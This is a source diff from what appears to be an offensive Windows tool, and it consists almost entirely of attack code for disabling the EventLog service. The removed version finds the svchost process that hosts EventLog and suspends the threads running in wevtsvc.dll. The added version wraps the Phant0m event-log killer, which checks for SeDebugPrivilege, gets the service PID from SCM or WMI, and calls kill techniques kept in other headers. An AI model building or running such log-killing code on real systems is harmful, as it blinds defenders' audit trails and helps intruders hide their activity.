@@ -1,92 +1,103 @@
-#include <iostream>
-#include <Windows.h>
-#include <Psapi.h>
-#include <TlHelp32.h>
-#include <dbghelp.h>
-#include <winternl.h>
+// Based off Phant0m Windows Event Log Killer
+#include <windows.h>
+#include <stdio.h>
 
-#pragma comment(lib, "DbgHelp")
+#include "../include/process_info.h"
 
-using myNtQueryInformationThread = NTSTATUS(NTAPI*)(
-	IN HANDLE          ThreadHandle,
-	IN THREADINFOCLASS ThreadInformationClass,
-	OUT PVOID          ThreadInformation,
-	IN ULONG           ThreadInformationLength,
-	OUT PULONG         ReturnLength
+// PID detection techniques configuration section.
+#define PID_FROM_SCM 1 // If you set it to 1, the PID of the Event Log service is obtained from the Service Manager.
+#define PID_FROM_WMI 0 // If you set it to 1, the PID of the Event Log service is obtained from the WMI.
+
+
+// TID detection and kill techniques configuration section. 
+#define KILL_WITH_T1 1 // If you set it to 1, Technique-1 will be use. For more information; https://github.com/hlldz/Phant0m
+#define KILL_WITH_T2 0 // If you set it to 1, Technique-2 will be use. For more information; https://github.com/hlldz/Phant0m
+
+
+#if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
+#include "../include/pid_SCM.h"
+#endif
+
+#if defined(PID_FROM_WMI) && PID_FROM_WMI == 1
+#include "../include/pid_WMI.h"
+#endif
+
+
+#if defined(KILL_WITH_T1) && KILL_WITH_T1 == 1
+#include "../include/technique_1.h"
+#endif
+
+#if defined(KILL_WITH_T2) && KILL_WITH_T2 == 1
+#include "../include/technique_2.h"
+#endif
+
+void Phant0m() {
+
+	puts(
+		"\t ___ _  _   _   _  _ _____ __  __  __ \n"
+		"\t| _ \\ || | /_\\ | \\| |_   _/  \\|  \\/  |\n"
+		"\t|  _/ __ |/ _ \\| .` | | || () | |\\/| |\n"
+		"\t|_| |_||_/_/ \\_\\_|\\_| |_| \\__/|_|  |_|\n\n"
+		"\tVersion: \t2.0\n"
+		"\tAuthor: \tHalil Dalabasmaz\n"
+		"\tWWW: \t\tartofpwn.com\n"
+		"\tTwitter: \t@hlldz\n"
+		"\tGithub: \t@hlldz\n"
 	);
 
-int logkiller()
-{
-	HANDLE serviceProcessHandle;
-	HANDLE snapshotHandle;
-	HANDLE threadHandle;
+	if (enoughIntegrityLevel() == TRUE) {
 
-	HMODULE modules[256] = {};
-	SIZE_T modulesSize = sizeof(modules);
-	DWORD modulesSizeNeeded = 0;
-	DWORD moduleNameSize = 0;
-	SIZE_T modulesCount = 0;
-	WCHAR remoteModuleName[128] = {};
-	HMODULE serviceModule = NULL;
-	MODULEINFO serviceModuleInfo = {};
-	DWORD_PTR threadStartAddress = 0;
-	DWORD bytesNeeded = 0;
+		printf("[+] Process Integrity Level is high, continuing...\n\n");
 
-	myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread"));
+		if (isPrivilegeOK() == TRUE) {
 
-	THREADENTRY32 threadEntry;
-	threadEntry.dwSize = sizeof(THREADENTRY32);
+#if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
+			DWORD dwEventLogPID = GetPIDFromSCManager();
+#endif
 
-	SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
-	SC_HANDLE service = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);
+#if defined(PID_FROM_WMI) && PID_FROM_WMI == 1
+			DWORD dwEventLogPID = GetPIDFromWMI();
+#endif
 
-	SERVICE_STATUS_PROCESS serviceStatusProcess = {};
+			if (dwEventLogPID != 0) {
 
-	//Get PID of svchost.exe that hosts EventLog service
-	QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded);
-	DWORD servicePID = serviceStatusProcess.dwProcessId;
+				printf("[+] Event Log service PID detected as %d.\n\n", dwEventLogPID);
 
-	// Open handle to the svchost.exe
-	serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);
-	snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+#if defined(KILL_WITH_T1) && KILL_WITH_T1 == 1
+				Technique_1(dwEventLogPID);
+#endif
 
-	// Get a list of modules loaded by svchost.exe
-	EnumProcessModules(serviceProcessHandle, modules, modulesSize, &modulesSizeNeeded);
-	modulesCount = modulesSizeNeeded / sizeof(HMODULE);
-	for (size_t i = 0; i < modulesCount; i++)
-	{
-		serviceModule = modules[i];
+#if defined(KILL_WITH_T2) && KILL_WITH_T2 == 1
+				Technique_2(dwEventLogPID);
+#endif
 
-		// Get loaded module's name
-		GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName));
+			}
+			else {
 
-		if (wcscmp(remoteModuleName, L"wevtsvc.dll") == 0)
-		{
-			printf("Windows EventLog module %S at %p\n\n", remoteModuleName, serviceModule);
-			GetModuleInformation(serviceProcessHandle, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO));
-		}
-	}
+				printf("[!] Exiting...\n");
 
-	// Enumerate threads
-	Thread32First(snapshotHandle, &threadEntry);
-	while (Thread32Next(snapshotHandle, &threadEntry))
-	{
-		if (threadEntry.th32OwnerProcessID == servicePID)
-		{
-			threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);
-			NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);
-			
-			// Check if thread's start address is inside wevtsvc.dll memory range
-			if (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)
-			{
-				printf("Suspending EventLog thread %d with start address %p\n", threadEntry.th32ThreadID, threadStartAddress);
-
-				// Suspend EventLog service thread
-				SuspendThread(threadHandle);
-				Sleep(2000);
 			}
 		}
+		else {
+
+			printf("[!] SeDebugPrivilege cannot enabled. Exiting...\n");
+
+		}
+
 	}
+	else {
+
+		printf("[!] Process Integrity Level is not high. Exiting...\n");
+
+	}
+
+	printf("\n[*] All done.\n");
+
+}
+
+int eventlogkiller() {
+
+	Phant0m();
 
 	return 0;
 }
